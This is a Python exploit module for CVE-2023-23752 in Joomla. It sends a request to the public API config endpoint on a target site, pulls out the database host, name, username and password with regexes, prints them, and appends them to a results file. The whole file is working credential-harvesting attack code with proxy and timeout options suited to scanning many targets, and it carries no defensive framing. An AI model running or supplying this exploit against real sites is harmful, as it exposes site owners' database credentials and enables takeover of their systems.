#!/user/bin/env python3
# -*- coding: utf-8 -*-
# Author: Pari Malam

import requests, re, urllib3
from colorama import Fore, init

init(autoreset=True)
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Cve_2023_23752:
    def scan_single_url(self,url):
        if url is None:
            url = input(f"\n{Fore.YELLOW}IP/Domain: {Fore.RESET}")

        if not url.startswith('https://') and not url.startswith('http://'):
            full_url = 'http://' + url
        else:
            full_url = url

        # print(f"\n{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - {Fore.WHITE}{url}{Fore.RED} .: {Fore.GREEN}[Scanning!]")
        try:
            headers = {
                "Host": url,
                "content-type": "application/vnd.api+json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            }
            response = requests.get(full_url, headers=headers, verify=self.ssl, timeout=self.timeout,proxies=self.proxy)
            config_url = full_url + '/api/index.php/v1/config/application?public=true'  # /api/index.php/v1/users?public=true
            config_response = requests.get(config_url,verify=self.ssl, timeout=self.timeout,proxies=self.proxy)
            if config_response.status_code == 200 and b'dbtype' in config_response.content:
                decoded_content = config_response.content.decode()
                if 'dbtype' in decoded_content:
                    dbtype = re.findall('"dbtype":"(.*?)"', decoded_content)[0]
                    dbprefix = re.findall('"dbprefix":"(.*?)"', decoded_content)[0]
                    host = re.findall('"host":"(.*?)"', decoded_content)[0]
                    db = re.findall('"db":"(.*?)"', decoded_content)[0]
                    user = re.findall('"user":"(.*?)"', decoded_content)[0]
                    password = re.findall('"password":"(.*?)"', decoded_content)[0]

                    print(f"{Fore.YELLOW}\n[+] Domain            : {Fore.GREEN}{url}")
                    print(f"{Fore.YELLOW}[+] Database Type     : {Fore.GREEN}{dbtype}")
                    print(f"{Fore.YELLOW}[+] Database Prefix   : {Fore.GREEN}{dbprefix}")
                    print(f"{Fore.YELLOW}[+] Database          : {Fore.GREEN}{db}")
                    print(f"{Fore.YELLOW}[+] Hostname          : {Fore.GREEN}{host}")
                    print(f"{Fore.YELLOW}[+] Username          : {Fore.GREEN}{user}")
                    print(f"{Fore.YELLOW}[+] Password          : {Fore.GREEN}{password}\n")

                    with open('./result/JoomlaConfigurations.txt', 'a') as f:
                        f.write(
                            f"[+] {url}\nDatabase Type     : {dbtype}\nDatabase Prefix   : {dbprefix}\nHostname          : {host}\nDatabase          : {db}\nUsername          : {user}\nPassword          : {password}\n\n")

                    return decoded_content, True
            else:
                # print(f"{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - 目标不存在漏洞")
                pass
        except Exception as e:
            # print(f"\n{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - {Fore.WHITE}{url}{Fore.RED} .: {Fore.RED}[Failed!]")
            pass

        return '', False





    def main(self,target):
        url = target[0].strip("/ ")
        self.ssl = target[1]
        proxy = target[2]
        self.timeout = int(target[3])
        self.proxy = {"http":proxy,"https":proxy}
        self.scan_single_url(url)
